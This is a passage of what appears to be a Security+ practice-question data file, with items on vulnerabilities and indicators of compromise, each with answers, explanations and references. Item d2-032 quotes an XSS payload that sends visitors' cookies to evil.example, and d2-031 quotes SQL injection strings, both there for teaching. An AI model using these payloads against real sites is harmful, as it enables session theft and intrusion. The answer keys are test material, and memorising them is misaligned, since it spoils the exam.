    explanation: "A buffer overflow happens when input larger than the allocated buffer spills into adjacent memory, which can crash the program or let the attacker run code. Input length checks and memory-safe languages prevent it. SQL injection and XSS abuse interpreters, a race condition depends on timing, and directory traversal abuses file paths.",
    hint: "Too much data for the space = buffer overflow.",
    refs: [
      { title: "NIST CSRC Glossary: buffer overflow", url: "https://csrc.nist.gov/glossary/term/buffer_overflow" },
      { title: "OWASP: Buffer Overflow Attack", url: "https://owasp.org/www-community/attacks/Buffer_overflow_attack" },
      { title: "Professor Messer SY0-701: Buffer Overflows", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/buffer-overflows-sy0-701/" }
    ]
  },
  {
    id: "d2-028", domain: 2, objective: "2.3", topic: "Race condition (TOCTOU)", type: "single",
    stems: [
      "A program checks that a user may write to /tmp/report.txt and then opens the file a few milliseconds later. In that gap, an attacker replaces the file with a link to /etc/passwd. Which of the following vulnerabilities is this?",
      "Two simultaneous withdrawal requests both pass the account-balance check before either one updates the balance, so the account goes negative. Which of the following vulnerabilities was exploited?",
      "Which of the following vulnerabilities is also known as time-of-check to time-of-use (TOCTOU)?"
    ],
    correct: ["Race condition"],
    wrong: ["Buffer overflow", "Memory injection", "SQL injection", "Directory traversal", "Integer overflow"],
    explanation: "A race condition occurs when the result depends on the timing of events, such as a gap between checking a resource and using it (TOCTOU). An attacker changes the resource in that gap, or two processes act on stale state at the same time. The other options are input-handling or memory flaws that do not depend on timing.",
    hint: "Check, then a gap, then use = TOCTOU race condition.",
    refs: [
      { title: "CWE-367: Time-of-check Time-of-use (TOCTOU) Race Condition", url: "https://cwe.mitre.org/data/definitions/367.html" },
      { title: "Professor Messer SY0-701: Race Conditions", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/race-conditions-sy0-701/" }
    ]
  },
  {
    id: "d2-029", domain: 2, objective: "2.3", topic: "Memory injection", type: "single",
    stems: [
      "EDR detects a malicious DLL being loaded into the address space of a legitimate explorer.exe process so that the code runs under that trusted process. Which of the following vulnerabilities is being exploited?",
      "Malware avoids writing files to disk and instead inserts its code directly into the memory of a running, trusted application. Which of the following best describes this technique?"
    ],
    correct: ["Memory injection"],
    wrong: ["Race condition", "Logic bomb", "SQL injection", "Directory traversal", "Malicious update"],
    explanation: "Memory injection (process injection) puts malicious code into the memory of another running process, such as through DLL injection. The code then runs with that process's privileges and is harder to detect. A race condition is a timing flaw, a logic bomb waits for a trigger, SQL injection targets a database, and a malicious update arrives through a vendor.",
    hint: "Code placed inside another process's memory = memory injection.",
    refs: [
      { title: "MITRE ATT&CK T1055 Process Injection", url: "https://attack.mitre.org/techniques/T1055/" },
      { title: "MITRE ATT&CK T1055.001 DLL Injection", url: "https://attack.mitre.org/techniques/T1055/001/" },
      { title: "Professor Messer SY0-701: Memory Injections", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/memory-injections-sy0-701/" }
    ]
  },
  {
    id: "d2-030", domain: 2, objective: "2.3", topic: "Malicious update", type: "single",
    stems: [
      "Attackers breach a software vendor's build system and insert a backdoor into a digitally signed update. Thousands of customers install the update through the normal update process. Which of the following vulnerabilities does this describe?",
      "A company installs an official update for its network monitoring tool, and the update contains hidden malicious code that attackers added at the vendor. Which of the following best describes this vulnerability?"
    ],
    correct: ["Malicious update"],
    wrong: ["Typosquatting", "Race condition", "VM escape", "Side loading"],
    explanation: "A malicious update is a legitimate-looking software update that contains attacker code, often because the vendor's build or update system was compromised (as in the SolarWinds Orion case). Customers trust it because it comes through the normal channel. Typosquatting uses fake domains, side loading installs from unofficial sources, and the other options are unrelated flaws.",
    hint: "Trusted update channel delivers the malware = malicious update.",
    refs: [
      { title: "Professor Messer SY0-701: Malicious Updates", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/malicious-updates-sy0-701/" },
      { title: "MITRE ATT&CK T1195.002 Compromise Software Supply Chain", url: "https://attack.mitre.org/techniques/T1195/002/" },
      { title: "CISA AA20-352A: APT Compromise (SolarWinds Orion)", url: "https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-352a" }
    ]
  },
  {
    id: "d2-031", domain: 2, objective: "2.3", topic: "SQL injection", type: "single",
    stems: [
      "A web server log contains this entry: GET /products.php?id=10' OR '1'='1' -- HTTP/1.1 200. Which of the following attacks does this entry indicate?",
      "An attacker enters admin' -- into a login form's username field and logs in without a password. Which of the following vulnerabilities was exploited?",
      "A developer fixes a flaw by replacing string-concatenated database queries with parameterized queries. Which of the following vulnerabilities was fixed?"
    ],
    correct: ["SQL injection"],
    wrong: ["Cross-site scripting", "Directory traversal", "Cross-site request forgery", "Buffer overflow", "Command injection"],
    explanation: "SQL injection inserts SQL syntax, such as quotes, OR '1'='1', or comment markers (--), into input that the application places into a database query. Parameterized queries stop it because input is never treated as SQL code. XSS targets browsers, directory traversal uses ../ paths, CSRF forges user requests, and command injection targets the OS shell.",
    hint: "Quotes, OR 1=1, and -- in input = SQL injection.",
    refs: [
      { title: "OWASP: SQL Injection", url: "https://owasp.org/www-community/attacks/SQL_Injection" },
      { title: "OWASP SQL Injection Prevention Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html" },
      { title: "Professor Messer SY0-701: SQL Injection", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/sql-injection-sy0-701/" }
    ]
  },
  {
    id: "d2-032", domain: 2, objective: "2.3", topic: "Cross-site scripting", type: "single",
    stems: [
      "A forum lets users post comments without filtering. An attacker posts <script>new Image().src='https://evil.example/c?'+document.cookie</script>, and the session cookie of every visitor goes to the attacker. Which of the following vulnerabilities does this show?",
      "A search page puts the search term back into the page without encoding it, so a crafted link runs JavaScript in the victim's browser. Which of the following vulnerabilities is this?",
      "A developer adds context-aware output encoding so that untrusted input cannot run as script in users' browsers. Which of the following vulnerabilities is the developer addressing?"
    ],
    correct: ["Cross-site scripting"],
    wrong: ["SQL injection", "Cross-site request forgery", "Directory traversal", "Server-side request forgery", "Buffer overflow"],
    explanation: "Cross-site scripting (XSS) injects script into a web page so that it runs in other users' browsers, where it can steal cookies or act as the user. Stored XSS saves the script on the site, and reflected XSS returns it from a crafted link. Output encoding and input validation prevent it. SQL injection targets the database, and CSRF and SSRF forge requests without injecting script into the page.",
    hint: "<script> in user input that runs in someone else's browser = XSS.",
    refs: [
      { title: "OWASP: Cross Site Scripting (XSS)", url: "https://owasp.org/www-community/attacks/xss/" },
      { title: "OWASP XSS Prevention Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" },
      { title: "Professor Messer SY0-701: Cross-site Scripting", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/cross-site-scripting-sy0-701/" }
    ]
  },
  {
    id: "d2-033", domain: 2, objective: "2.3", topic: "Firmware vulnerability", type: "single",
    stems: [
      "A vulnerability is found in the UEFI code of a model of company laptops. Operating system patches cannot fix it; only an update from the hardware manufacturer can. Which of the following types of vulnerability is this?",
      "A smart thermostat on the corporate network has a known flaw in its embedded software, and only the manufacturer can release a fixed version. Which of the following vulnerability types does this describe?"
    ],
    correct: ["Firmware vulnerability"],
    wrong: ["Web-based vulnerability", "Virtualization vulnerability", "Cryptographic vulnerability", "Misconfiguration", "Side loading"],
    explanation: "Firmware is the low-level software built into hardware, such as UEFI/BIOS or the embedded code in IoT devices. Users usually cannot see or change it, so only the manufacturer can fix a flaw, sometimes slowly. The vulnerability is not in a web app, hypervisor, cipher, setting, or app installation source.",
    hint: "Only the hardware maker can patch it = firmware.",
    refs: [
      { title: "NIST CSRC Glossary: firmware", url: "https://csrc.nist.gov/glossary/term/firmware" },
      { title: "Professor Messer SY0-701: Hardware Vulnerabilities", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/hardware-vulnerabilities-sy0-701/" },
      { title: "NIST SP 800-193: Platform Firmware Resiliency Guidelines", url: "https://csrc.nist.gov/pubs/sp/800/193/final" }
    ]
  },
  {
    id: "d2-034", domain: 2, objective: "2.3", topic: "VM escape", type: "single",
    stems: [
      "A tester breaks out of a guest virtual machine through a hypervisor bug and then reads data on other VMs that run on the same host. Which of the following vulnerabilities was exploited?",
      "A cloud provider's top concern is that a tenant could exploit a flaw so that code in the tenant's VM reaches the host hypervisor and other tenants. Which of the following describes this concern?"
    ],
    correct: ["VM escape"],
    wrong: ["Resource reuse", "Side loading", "Race condition", "Jailbreaking", "SQL injection"],
    explanation: "A VM escape lets an attacker break out of a guest VM to the hypervisor, and from there reach other VMs on the same host. It is serious because one hypervisor can host many systems. Resource reuse is data left in shared memory or storage, and side loading and jailbreaking are mobile issues.",
    hint: "Break out of the guest to the host = VM escape.",
    refs: [
      { title: "Professor Messer SY0-701: Virtualization Vulnerabilities", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/virtualization-vulnerabilities-sy0-701/" },
      { title: "MITRE ATT&CK T1611 Escape to Host", url: "https://attack.mitre.org/techniques/T1611/" },
      { title: "NIST SP 800-125A Rev. 1: Hypervisor Platforms", url: "https://csrc.nist.gov/pubs/sp/800/125/a/r1/final" }
    ]
  },
  {
    id: "d2-035", domain: 2, objective: "2.3", topic: "Resource reuse", type: "single",
    stems: [
      "Because of a hypervisor memory-management bug, one VM can read memory areas that another VM recently wrote to. Which of the following virtualization vulnerabilities is this?",
      "A new cloud instance is assigned storage blocks that still contain readable data from a previous tenant's deleted volume. Which of the following vulnerabilities does this describe?"
    ],
    correct: ["Resource reuse"],
    wrong: ["VM escape", "Buffer overflow", "Memory injection", "Side loading", "Race condition"],
    explanation: "Resource reuse occurs when memory or storage that one VM or tenant used is given to another without being cleared, so leftover data can be read. The hypervisor must clear or isolate shared resources. A VM escape breaks out to the host, and buffer overflow and memory injection are application memory attacks.",
    hint: "Leftover data in reassigned memory or disk = resource reuse.",
    refs: [
      { title: "Professor Messer SY0-701: Virtualization Vulnerabilities", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/virtualization-vulnerabilities-sy0-701/" },
      { title: "NIST CSRC Glossary: object reuse", url: "https://csrc.nist.gov/glossary/term/object_reuse" },
      { title: "CWE-226: Sensitive Information in Resource Not Removed Before Reuse", url: "https://cwe.mitre.org/data/definitions/226.html" }
    ]
  },
  {
    id: "d2-036", domain: 2, objective: "2.3", topic: "Cloud misconfiguration", type: "single",
    stems: [
      "A security researcher downloads thousands of customer records from a company's cloud object storage bucket that was set to allow public read access. Which of the following vulnerabilities caused this exposure?",
      "A cloud security posture scan finds a storage container that anyone on the internet can list and read because of its access policy. Which of the following best describes this issue?"
    ],
    correct: ["Misconfiguration"],
    wrong: ["Zero-day vulnerability", "VM escape", "Race condition", "Firmware vulnerability", "Buffer overflow"],
    explanation: "A storage bucket open to the public is a misconfiguration: the service works as designed, but its settings expose data. In the cloud shared responsibility model, the customer is responsible for these settings. No software flaw, hypervisor breakout, timing bug, or firmware issue is involved.",
    hint: "Software works fine, settings expose it = misconfiguration.",
    refs: [
      { title: "Professor Messer SY0-701: Misconfiguration Vulnerabilities", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/misconfiguration-vulnerabilities-sy0-701/" },
      { title: "Professor Messer SY0-701: Cloud-specific Vulnerabilities", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/cloud-specific-vulnerabilities-sy0-701/" },
      { title: "AWS Shared Responsibility Model", url: "https://aws.amazon.com/compliance/shared-responsibility-model/" }
    ]
  },
  {
    id: "d2-037", domain: 2, objective: "2.3", topic: "Side loading", type: "single",
    stems: [
      "An employee installs a game on a company Android phone by downloading an APK file from a website instead of the official app store. Which of the following vulnerabilities does this create?",
      "An MDM report flags several phones that have apps installed from sources other than the approved app store. Which of the following risks is the MDM detecting?"
    ],
    correct: ["Side loading"],
    wrong: ["Jailbreaking", "VM escape", "Resource reuse", "Malicious update", "Bluejacking"],
    explanation: "Side loading installs apps from outside the official app store, which skips the store's security review and can bring in malware. Jailbreaking removes the operating system's built-in restrictions, which is a different action. VM escape and resource reuse are virtualization issues, and bluejacking sends unwanted Bluetooth messages.",
    hint: "App from outside the official store = side loading.",
    refs: [
      { title: "Professor Messer SY0-701: Mobile Device Vulnerabilities", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/mobile-device-vulnerabilities-sy0-701/" },
      { title: "NIST SP 800-124 Rev. 2: Managing the Security of Mobile Devices", url: "https://csrc.nist.gov/pubs/sp/800/124/r2/final" }
    ]
  },
  {
    id: "d2-038", domain: 2, objective: "2.3", topic: "Jailbreaking", type: "single",
    stems: [
      "A user installs a tool on a corporate iPhone that removes Apple's operating system restrictions, which gives the user root access to change system files. Which of the following best describes this action?",
      "A mobile security policy says that iOS devices whose built-in security restrictions were removed must be blocked from corporate email. Which of the following conditions does this policy address?"
    ],
    correct: ["Jailbreaking"],
    wrong: ["Side loading", "Resource reuse", "Typosquatting", "VM escape", "Bluesnarfing"],
    explanation: "Jailbreaking removes the restrictions that the manufacturer built into iOS, which gives the user root-level access and disables many security controls. It often makes side loading possible, but side loading is the installation of apps from unofficial sources, not the removal of OS restrictions. The other options are unrelated attacks.",
    hint: "Break the iOS restrictions = jailbreak.",
    refs: [
      { title: "Professor Messer SY0-701: Mobile Device Vulnerabilities", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/mobile-device-vulnerabilities-sy0-701/" },
      { title: "NIST SP 800-124 Rev. 2: Managing the Security of Mobile Devices", url: "https://csrc.nist.gov/pubs/sp/800/124/r2/final" }
    ]
  },
  {
    id: "d2-039", domain: 2, objective: "2.3", topic: "Zero-day", type: "single",
    stems: [
      "Attackers exploit a flaw in a widely used VPN appliance that the vendor did not know about, and no patch exists yet. Which of the following best describes this vulnerability?",
      "A threat report describes an exploit for a browser vulnerability that was never publicly disclosed and for which the vendor has no fix. Which of the following terms applies?"
    ],
    correct: ["Zero-day vulnerability"],
    wrong: ["Misconfiguration", "Malicious update", "Race condition", "Default credentials"],
    explanation: "A zero-day vulnerability is unknown to the vendor or has no patch yet, so defenders have had zero days to fix it. Defense depends on layered controls and monitoring until a patch is released. A misconfiguration or default credential is a setting problem, a malicious update comes through the vendor channel, and a race condition is a type of flaw, not a disclosure status.",
    hint: "Unknown to the vendor, no patch yet = zero-day.",
    refs: [
      { title: "NIST CSRC Glossary: zero day attack", url: "https://csrc.nist.gov/glossary/term/zero_day_attack" },
      { title: "Professor Messer SY0-701: Zero-day Vulnerabilities", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/zero-day-vulnerabilities-sy0-701/" }
    ]
  },
  {
    id: "d2-040", domain: 2, objective: "2.3", topic: "Cryptographic vulnerabilities", type: "multi",
    stems: [
      "A vulnerability scan of a web application lists several findings. Which of the following findings are cryptographic vulnerabilities?",
      "An auditor reviews how an application protects its data. Which of the following should the auditor report as cryptographic weaknesses?"
    ],
    correct: ["Passwords stored as unsalted MD5 hashes", "Server accepts SSL 3.0 connections"],
    wrong: ["Web server listens on TCP port 443", "Disk volumes use AES-256 encryption", "TLS 1.3 is required for all sessions", "Files are verified with SHA-256 hashes"],
    explanation: "MD5 is broken for security use, and unsalted hashes are open to precomputed (rainbow table) attacks, so password storage must use a salted, slow algorithm. SSL 3.0 is deprecated because of known attacks such as POODLE. AES-256, TLS 1.3, and SHA-256 are current strong choices, and port 443 is simply the HTTPS port.",
    hint: "Old or broken algorithms and protocols (MD5, SSL) = cryptographic vulnerability.",
    refs: [
      { title: "OWASP Password Storage Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html" },
      { title: "RFC 7568: Deprecating SSL Version 3.0", url: "https://www.rfc-editor.org/rfc/rfc7568" },
      { title: "CWE-327: Use of a Broken or Risky Cryptographic Algorithm", url: "https://cwe.mitre.org/data/definitions/327.html" }
    ]
  },

  // ---------- 2.4 Indicators of malicious activity ----------
  {
    id: "d2-041", domain: 2, objective: "2.4", topic: "Brute force", type: "single",
    stems: [
      "An SSH log shows 'Failed password for root from 198.51.100.23' repeated 4,812 times in nine minutes, followed by 'Accepted password for root from 198.51.100.23'. Which of the following attacks most likely occurred?",
      "A web application's admin account gets thousands of login attempts from one source, each with a different password, until one attempt succeeds. Which of the following best describes this attack?",
      "Which of the following password attacks tries a very large number of passwords against a single account until one works?"
    ],
    correct: ["Brute force"],
    wrong: ["Password spraying", "Credential replay", "Birthday attack", "Downgrade attack"],
    explanation: "A brute force attack tries many passwords against the same account, which creates a large number of failures for that one account. Account lockout and rate limiting are the usual defenses. Password spraying tries a few passwords across many accounts, credential replay reuses a captured hash or token, and birthday and downgrade attacks target cryptography.",
    hint: "One account, thousands of failures = brute force.",
    refs: [
      { title: "MITRE ATT&CK T1110 Brute Force", url: "https://attack.mitre.org/techniques/T1110/" },
      { title: "OWASP: Brute Force Attack", url: "https://owasp.org/www-community/attacks/Brute_force_attack" },
      { title: "Professor Messer SY0-701: Password Attacks (2.4)", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/password-attacks-sy0-701/" }
    ]
  },
  {
    id: "d2-042", domain: 2, objective: "2.4", topic: "Impossible travel and concurrent sessions", type: "multi",
    stems: [
      "A SIEM shows this activity for user kchen: '08:02 VPN login success, Denver US, session active' and '08:19 VPN login success, Lagos NG, session active'. Both sessions are still open. Which of the following indicators does this activity show?",
      "Single sign-on logs show that the same account authenticated from Toronto and from Singapore 12 minutes apart, and both sessions are still in use. Which of the following indicators of compromise are present?"
    ],
    correct: ["Impossible travel", "Concurrent session usage"],
    wrong: ["Out-of-cycle logging", "Blocked content", "Missing logs", "Resource consumption"],
    explanation: "Logins from two distant locations a few minutes apart are impossible travel, because no one can move that fast. Because both sessions are active at the same time, the logs also show concurrent session usage. Together these strongly suggest that someone else is using the credentials. The log shows no unusual timing of scheduled events, blocked updates, gaps in logs, or resource spikes.",
    hint: "Too far, too fast = impossible travel. Two live sessions at once = concurrent.",
    refs: [
      { title: "Professor Messer SY0-701: Indicators of Compromise", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/indicators-of-compromise-sy0-701/" },
      { title: "MITRE ATT&CK T1078 Valid Accounts", url: "https://attack.mitre.org/techniques/T1078/" }
    ]
  },
  {
    id: "d2-043", domain: 2, objective: "2.4", topic: "Indicators of compromise", type: "match",
    stems: [
      "A SOC analyst reviews several observations from the past week. Match each observation with the indicator of malicious activity it best represents."
    ],
    pairs: [
      { item: "The help desk gets calls from many users whose accounts were locked before they arrived at work", answer: "Account lockout" },
      { item: "Patch installation entries appear at 3:12 AM on a Sunday, outside the approved change window", answer: "Out-of-cycle logging" },
      { item: "The Windows Security log shows Event ID 1102 (audit log cleared) and a six-hour gap in entries", answer: "Missing logs" },
      { item: "One workstation can no longer reach its antivirus signature server or the OS update site", answer: "Blocked content" },
      { item: "A file server's CPU stays at 100% and its outbound traffic is 40 times its normal volume", answer: "Resource consumption" },
      { item: "The company's customer database appears for sale on a public leak site", answer: "Published/documented" }
    ],
    extraOptions: ["Impossible travel", "Concurrent session usage"],
    explanation: "Unexpected lockouts suggest password guessing against those accounts. Log entries at a time when they should not occur are out-of-cycle logging. Cleared logs or gaps show an attacker hiding activity. Malware often blocks security updates and security sites so that it can stay on the system. Unusual CPU or bandwidth use is resource consumption, and stolen data that shows up publicly is a published/documented indicator.",
    hint: "Match the symptom: locked accounts, odd-time logs, log gaps, blocked updates, spikes, data in public.",
    refs: [
      { title: "Professor Messer SY0-701: Indicators of Compromise", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/indicators-of-compromise-sy0-701/" },
      { title: "MITRE ATT&CK T1070 Indicator Removal", url: "https://attack.mitre.org/techniques/T1070/" },
      { title: "NIST SP 800-92: Guide to Computer Security Log Management", url: "https://csrc.nist.gov/pubs/sp/800/92/final" }
    ]
  },
  {
    id: "d2-044", domain: 2, objective: "2.4", topic: "Malware identification", type: "match",
    stems: [
      "A security analyst reviews several incident notes. Match each observed behavior with the malware type it most likely indicates."
    ],
    pairs: [
      { item: "Files are encrypted and a payment note is left on the desktop", answer: "Ransomware" },
      { item: "A free game download secretly installs a backdoor for remote access", answer: "Trojan" },
      { item: "Code spreads by itself from host to host through an SMB flaw with no user action", answer: "Worm" },
      { item: "Every keystroke, including passwords, is recorded and sent to a remote server", answer: "Keylogger" },
      { item: "Code deletes the payroll database when a specific employee is removed from the HR system", answer: "Logic bomb" },
      { item: "Malware modifies the kernel so that its own files and processes do not show in system tools", answer: "Rootkit" }
    ],
    extraOptions: ["Bloatware", "Virus"],
    explanation: "Ransomware encrypts data and demands payment. A Trojan pretends to be legitimate software while it carries a hidden payload. A worm self-replicates over the network without user action, while a virus needs a user to run an infected file. A keylogger records keystrokes, a logic bomb waits for a trigger event, and a rootkit hides itself deep in the operating system.",
    hint: "Encrypt = ransomware; disguise = Trojan; self-spread = worm; keystrokes = keylogger; trigger = logic bomb; hide in the kernel = rootkit.",
    refs: [
      { title: "Professor Messer SY0-701: An Overview of Malware", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/an-overview-of-malware-sy0-701/" },
      { title: "Professor Messer SY0-701: Other Malware Types", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/other-malware-types-sy0-701/" },
      { title: "NIST SP 800-83 Rev. 1: Malware Incident Prevention and Handling", url: "https://csrc.nist.gov/pubs/sp/800/83/r1/final" }
    ]
  },
  {
    id: "d2-045", domain: 2, objective: "2.4", topic: "Bloatware", type: "single",
    stems: [
      "A company buys 300 new laptops and finds many manufacturer-installed trial apps and utilities that nobody needs and that use disk space and memory. Which of the following best describes this software?",
      "A security team removes preinstalled games and vendor utilities from new phones because the apps are unnecessary and add attack surface. Which of the following types of software is the team removing?"
    ],
    correct: ["Bloatware"],
    wrong: ["Spyware", "Rootkit", "Trojan", "Worm", "Logic bomb"],
    explanation: "Bloatware is unnecessary software that the manufacturer preinstalls. It uses storage and memory, and any vulnerabilities in it add attack surface, so removing it is a hardening step. Spyware secretly collects data, a rootkit hides in the OS, a Trojan disguises a malicious payload, a worm self-replicates, and a logic bomb waits for a trigger.",
    hint: "Preinstalled and unneeded = bloatware.",
    refs: [
      { title: "Professor Messer SY0-701: Spyware and Bloatware", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/spyware-and-bloatware-sy0-701/" }
    ]
  },
  {
    id: "d2-046", domain: 2, objective: "2.4", topic: "RFID cloning", type: "single",
    stems: [
      "Badge logs show that an engineer entered the data center at 2 AM while she was on a flight. Investigators learn that a stranger stood close to her on a train with a small handheld reader. Which of the following attacks most likely occurred?",
      "A penetration tester uses a cheap handheld device to read an employee's proximity badge in an elevator, and then writes the data to a blank card that opens the same doors. Which of the following attacks did the tester perform?"
    ],
    correct: ["RFID cloning"],
    wrong: ["Environmental attack", "Physical brute force", "Bluejacking", "Deauthentication attack"],
    explanation: "RFID cloning reads the data from an access badge or key fob and copies it to another card in seconds, which gives the attacker the same physical access. MFA, such as a badge plus a PIN, reduces the risk. Environmental attacks target power or HVAC, physical brute force breaks doors or windows, and bluejacking and deauthentication are wireless attacks.",
    hint: "Copy the badge = RFID cloning.",
    refs: [
      { title: "Professor Messer SY0-701: Physical Attacks", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/physical-attacks-sy0-701/" },
      { title: "CAPEC-399: Cloning RFID Cards or Chips", url: "https://capec.mitre.org/data/definitions/399.html" }
    ]
  },
  {
    id: "d2-047", domain: 2, objective: "2.4", topic: "Environmental attack", type: "single",
    stems: [
      "An attacker gets into a data center's HVAC control system and turns off the cooling, so the servers overheat and shut down. Which of the following attacks is this?",
      "An intruder cuts the outside power feed to a building that houses a company's server room in order to take its services offline. Which of the following best describes this attack?"
    ],
    correct: ["Environmental attack"],
    wrong: ["RFID cloning", "Physical brute force", "Logic bomb", "Deauthentication attack"],
    explanation: "An environmental attack targets the systems that support the computers, such as power, HVAC, or fire suppression, instead of the computers themselves. The result is often a denial of service. RFID cloning copies badges, physical brute force breaks through doors or windows, a logic bomb is triggered code, and deauthentication disrupts Wi-Fi.",
    hint: "Attack the power, cooling, or fire system = environmental.",
    refs: [
      { title: "Professor Messer SY0-701: Physical Attacks", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/physical-attacks-sy0-701/" }
    ]
  },
  {
    id: "d2-048", domain: 2, objective: "2.4", topic: "Reflected and amplified DDoS", type: "single",
    stems: [
      "A company's web servers are flooded with large DNS response packets from thousands of open resolvers, although the company never sent any DNS queries. Which of the following attacks is most likely occurring?",
      "An attacker sends small DNS queries that carry the victim's spoofed source IP address to many open resolvers, and the resolvers send much larger replies to the victim. Which of the following best describes this attack?",
      "Which of the following DDoS techniques sends spoofed requests to third-party servers so that larger responses are directed at the target?"
    ],
    correct: ["Reflected amplification DDoS"],
    wrong: ["DNS cache poisoning", "Domain hijacking", "SYN flood", "Deauthentication attack", "ARP poisoning"],
    explanation: "In a reflected amplification DDoS, the attacker spoofs the victim's IP address in small requests to services such as open DNS resolvers or NTP. The services send much larger responses to the victim, which multiplies the attack traffic. DNS cache poisoning and domain hijacking redirect users instead of flooding them, a SYN flood is not reflected, and deauthentication and ARP poisoning are LAN attacks.",
    hint: "Spoofed source + small question + big answers sent to the victim = reflected amplification.",
    refs: [
      { title: "MITRE ATT&CK T1498.002 Reflection Amplification", url: "https://attack.mitre.org/techniques/T1498/002/" },
      { title: "CISA: UDP-Based Amplification Attacks", url: "https://www.cisa.gov/news-events/alerts/2014/01/17/udp-based-amplification-attacks" },
      { title: "Professor Messer SY0-701: Denial of Service", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/denial-of-service-sy0-701/" }
    ]
  },
  {
    id: "d2-049", domain: 2, objective: "2.4", topic: "Domain hijacking", type: "single",
    stems: [
      "Attackers phish the credentials for a company's domain registrar account and change the domain's name server records, so all of the company's traffic goes to attacker servers. Which of the following attacks occurred?",
      "A company loses control of its domain name after someone transfers it to a different registrar account without permission. Which of the following best describes this attack?"
    ],
    correct: ["Domain hijacking"],
    wrong: ["DNS cache poisoning", "Typosquatting", "Reflected amplification DDoS", "ARP poisoning"],
    explanation: "Domain hijacking takes control of the domain registration itself, usually through the registrar account, so the attacker controls where the domain points. DNS cache poisoning puts false records into a resolver's cache without control of the domain. Typosquatting registers a different, similar name, and the other options are flooding and LAN attacks.",
    hint: "Attacker owns the registrar account = domain hijacking.",
    refs: [
      { title: "Professor Messer SY0-701: DNS Attacks", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/dns-attacks-sy0-701/" },
      { title: "MITRE ATT&CK T1584.001 Compromise Infrastructure: Domains", url: "https://attack.mitre.org/techniques/T1584/001/" }
    ]
  },
  {
    id: "d2-050", domain: 2, objective: "2.4", topic: "Deauthentication attack", type: "single",
    stems: [
      "A wireless IDS alerts on hundreds of spoofed 802.11 deauthentication frames, and every user on the guest Wi-Fi is disconnected again and again. Which of the following attacks is occurring?",
      "Users say they keep getting dropped from the corporate Wi-Fi. A packet capture shows management frames, which appear to come from the access point, that tell the clients to disconnect. Which of the following best describes this attack?",
      "Which of the following wireless attacks does enabling 802.11w management frame protection help prevent?"
    ],
    correct: ["Deauthentication attack"],
    wrong: ["RF jamming", "Bluejacking", "ARP poisoning", "DNS cache poisoning"],
    explanation: "A deauthentication attack sends spoofed 802.11 management frames that tell clients to disconnect, which causes a denial of service. 802.11w (Protected Management Frames) protects these frames. RF jamming floods the radio frequency with noise instead of sending forged frames, bluejacking sends Bluetooth messages, and ARP and DNS poisoning redirect traffic.",
    hint: "Forged disconnect frames = deauth; 802.11w is the fix.",
    refs: [
      { title: "Professor Messer SY0-701: Wireless Attacks", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/wireless-attacks-sy0-701/" },
      { title: "NIST SP 800-153: Guidelines for Securing WLANs", url: "https://csrc.nist.gov/pubs/sp/800/153/final" }
    ]
  },
  {
    id: "d2-051", domain: 2, objective: "2.4", topic: "On-path (ARP poisoning)", type: "single",
    stems: [
      "A workstation's ARP table shows '192.168.10.1  00-1a-2b-3c-4d-5e' (the default gateway) and '192.168.10.77  00-1a-2b-3c-4d-5e'. Users report that some websites now show certificate warnings. Which of the following attacks is most likely occurring?",
      "An attacker on the same LAN sends unsolicited ARP replies that map the gateway's IP address to the attacker's MAC address, so all traffic passes through the attacker's laptop. Which of the following best describes this attack?"
    ],
    correct: ["ARP poisoning (on-path attack)"],
    wrong: ["DNS cache poisoning (redirection)", "MAC flooding (switch overload)", "Deauthentication attack (Wi-Fi)", "Domain hijacking (registrar)"],
    explanation: "When the gateway's IP address and another host share one MAC address, ARP caches were poisoned so traffic goes through the attacker, who sits on-path between victims and the gateway. Certificate warnings often appear when the attacker tries to intercept TLS. DNS poisoning changes name records, MAC flooding overloads a switch's MAC table, deauthentication disconnects Wi-Fi clients, and domain hijacking takes over a registrar account.",
    hint: "Gateway IP and another host share one MAC = ARP poisoning.",
    refs: [
      { title: "MITRE ATT&CK T1557.002 ARP Cache Poisoning", url: "https://attack.mitre.org/techniques/T1557/002/" },
      { title: "Professor Messer SY0-701: On-path Attacks", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/on-path-attacks-sy0-701/" }
    ]
  },
  {
    id: "d2-052", domain: 2, objective: "2.4", topic: "Credential replay (pass-the-hash)", type: "single",
    stems: [
      "Windows logs show NTLM logons to several servers with a domain administrator's account while the administrator was on vacation. Investigators find that the attacker used a captured password hash and never learned the actual password. Which of the following attacks occurred?",
      "An attacker captures a user's session token on an unsecured network and sends it to a web application to act as the user without logging in. Which of the following best describes this attack?"
    ],
    correct: ["Credential replay"],
    wrong: ["Password spraying", "Brute force", "Birthday attack", "Downgrade attack"],
